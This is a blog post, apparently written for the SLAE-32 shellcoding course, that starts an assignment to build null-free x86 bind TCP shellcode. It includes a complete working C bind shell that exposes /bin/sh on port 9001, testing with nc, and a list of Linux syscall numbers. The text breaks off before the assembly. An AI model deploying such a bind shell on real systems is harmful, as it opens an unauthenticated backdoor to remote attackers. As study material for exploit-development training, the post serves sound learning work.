[{"content":" This post introduces the first mission to my SLAE-32 journey.\nIntroduction The main goal for the first SLAE-32 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nThe shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user. Bind TCP shell? What is this? Generally, a bind TCP shell or bind shell is created when a listening port is configured to redirect the input, output, and errors of an executable (mostly /bin/sh or /bin/bash) to an incoming connection.\nIn practical terms, any machine connecting to this port will be presented with a shell prompt on the target computer and can interact with it.\n(put image)\nA TCP bind shell is a common technique to create backdoors and persistence in a target machine.\nBasics First Before putting our hands-on on developing the shellcode, we should be familiar with the fundamental principles of how to create a proper bind shell. This way, we will better understand how the internals work and where to debug if an error occurs.\nMy approach was to analyze TCP bind shell implementation in a higher-level language, such as C.\nAnalysis of a TCP bind shell in C Beforehand, analyzing the following code gives an idea of the structure and what syscalls need to be used.\n// from https://infosecwriteups.com/expdev-bind-tcp-shellcode-cebb5657a997 #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; // 1) Socket Creation (sys_socket 1) sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Bind() Syscall (sys_bind 2) bind(sockfd, (struct sockaddr *) \u0026amp;addr, sizeof(addr)); // 3) Listen() Syscall (sys_listen 4) listen(sockfd, 0); // 4) Accept() Syscall (sys_accept 5) acceptfd = accept(sockfd, NULL, NULL); // 5) Dup2() Syscall dup2(acceptfd, 0); // stdin dup2(acceptfd, 1); // stdout dup2(acceptfd, 2); // stderr // 6) Execve() Syscall execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); return 0; } Testing the code to see how it behaves.\nCompiling with gcc\n$ gcc bind.c -o bind\nExecuting bind and using nc to perform a connection to port 9001 in localhost\nThe C bind shell works as expected. From this we have a reference to build our shellcode.\nChecking which syscalls are used In total there are 6 syscall enumerated below:\nsocket - 359 - 0x167 bind - 361 - 0x169 listen - 363 - 0x16b accept4 - 364 - 0x16c dup2 - 63 - 0x3f execve - 11 - 0xb We can use the file /usr/include/x86_64-linux-gnu/asm/unistd_32 to check the definiton of each syscall.\nCode \u0026ldquo;assembling\u0026rdquo; - Building our shellcode Let\u0026rsquo;s dive into each syscall and analyse why they are used and how we can define them in intel x86 ISA.\nSocket syscall (0x167) The socket syscall has 3 parameters\ndomain - The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.\nIn this case, we are interested in the AF_INET flag wich purpose is for IPv4 communication.\nSearching on the internet for where Socket is defined in the Linux environment, I found this Stackoverflow question.\nAfter checking each one the file /usr/include/x86_64-linux-gnu/bits/socket.h has the value we are looking for\n","permalink":"https://0xnibbles.github.io/posts/slae_32_assignment_1/","summary":"This post introduces the first mission to my SLAE-32 journey.\nIntroduction The main goal for the first SLAE-32 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nThe shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user. Bind TCP shell? What is this? Generally, a bind TCP shell or bind shell is created when a listening port is configured to redirect the input, output, and errors of an executable (mostly /bin/sh or /bin/bash) to an incoming connection.","title":"SLAE32 Assignment 1 - Shell Bind TCP"}]